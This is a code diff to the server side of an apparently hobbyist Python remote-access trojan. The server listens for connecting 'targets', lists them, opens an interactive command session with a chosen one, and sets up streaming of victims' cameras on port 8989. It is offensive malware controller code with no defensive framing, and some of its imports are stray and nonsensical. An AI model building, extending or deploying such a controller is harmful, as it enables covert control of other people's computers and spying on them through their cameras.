@@ -1,4 +1,5 @@
 from ast import While
+from lib2to3.pgen2.token import COMMA
 import colorama
 import socket
 from vidstream import StreamingServer
@@ -12,7 +13,7 @@ import time
 TARGETS = {}
 HOST = socket.gethostbyname(socket.gethostname())
 PORT = 1827
-CAMERA_STREAMING_PORT = 0
+CAMERA_STREAMING_PORT = 8989
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.bind((HOST , PORT))
 server.listen(3)
@@ -53,6 +54,7 @@ def TARGETS_SHOWER():
     print(TARGET_TABLE)
 
 def connect_with_host(target_add):
+    SESSION_START_STR = "session start"
     while True:
         SERVER_UP = False
         print(f"{Splus} {CR.green()}Connected to {CR.red()}{TARGETS[target_add][0]}{CR.white()}")
@@ -85,20 +87,23 @@ def connect_with_host(target_add):
 def run():
     print(f"{Ssowrd} {CR.green()}Waiting for any upcoming connecting...")
     add, ip = server.accept()
-    data = add.recv(1999)
-    with open("data.json", "w") as JSON:
-        JSON.write(data.decode())
-    print(data) 
     print(f"{Splus} {CR.green()}Target connected {CR.yellow()} |{CR.red()} Host> {CR.blue()}{ip[0]} {CR.red()}Port> {CR.blue()}{ip[1]}")
     if add in TARGETS:
         pass
     else:
         TARGETS[add] = ip    
     print(f" {Splus} {CR.green()}Target added to list{CR.white()}")
-    while True:    
+    while True:   
         COMMAND_INPUT = input(f"\r   {CR.red()} <|{CR.green()}SERVER{CR.red()}|>{CR.blue()}|{CR.white()}=> {CR.white()}")
         if COMMAND_INPUT == "show target":
             TARGETS_SHOWER()
         elif COMMAND_INPUT.startswith("connect"):
-            connect_with_host()
+            THE_ADDR = COMMAND_INPUT.replace("connect ", "")
+            if THE_ADDR:
+                for x in TARGETS:
+                    if x.getsockname()[0] == THE_ADDR:
+                        connect_with_host(target_add=x)
+            else:
+                print(f"{Sminess} {CR.red()}Target not specified{CR.white()}")
+
 run()
